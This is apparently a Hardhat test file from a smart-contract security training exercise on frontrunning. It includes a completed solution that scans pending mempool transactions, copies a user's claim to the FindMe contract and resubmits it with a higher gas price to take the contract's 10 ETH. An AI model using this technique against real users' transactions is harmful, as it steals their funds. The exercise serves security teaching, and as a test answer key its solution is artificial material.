import {ethers, network} from 'hardhat';
import {expect} from 'chai';
import {SignerWithAddress} from '@nomicfoundation/hardhat-ethers/signers';
import {FindMe} from '../../typechain-types';

const {provider, deployContract, getSigners, parseEther, parseUnits} = ethers;

/**
 * @dev run "npx hardhat test test/frontrunning-1/tests.ts"
 */
describe('Frontrunning Attack Exercise 1', function () {
  let deployer: SignerWithAddress, user: SignerWithAddress, attacker: SignerWithAddress;

  let attackerInitialBalance: bigint;

  let findMe: FindMe;

  before(async function () {
    /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

    [deployer, user, attacker] = await getSigners();
    attackerInitialBalance = await provider.getBalance(attacker.address);

    findMe = await deployContract('FindMe', {
      value: parseEther('10'),
    });
    await provider.send('evm_mine', []);

    const obfuscatedString = atob('RXRoZXJldW0=');
    await findMe.connect(user).claim(obfuscatedString);
  });

  it('Exploit', async function () {
    /** CODE YOUR SOLUTION HERE */

    // TODO: Get all the tx's in the mempool
    const {transactions} = await network.provider.send('eth_getBlockByNumber', ['pending', true]);
    const findMeAddress = await findMe.getAddress();

    // TODO: Find the tx that is sending eth to the FindMe contract
    const txClaim = transactions.find((tx: any) => {
      return tx.to.toLowerCase() === findMeAddress.toLowerCase();
    });

    // TODO: Send the same tx with more gas
    await attacker.sendTransaction({
      to: findMeAddress,
      data: txClaim.input,
      gasPrice: txClaim.gasPrice + 1,
      gasLimit: txClaim.gas,
    });
  });

  after(async function () {
    // Mine all the transactions
    await provider.send('evm_mine', []);

    // Check if the attacker have in his balance at leat 9.9 more eth than what he had before
    const attackerBalance = await provider.getBalance(attacker.address);
    expect(attackerBalance).is.gt(attackerInitialBalance + parseEther('9.9'));
  });
});
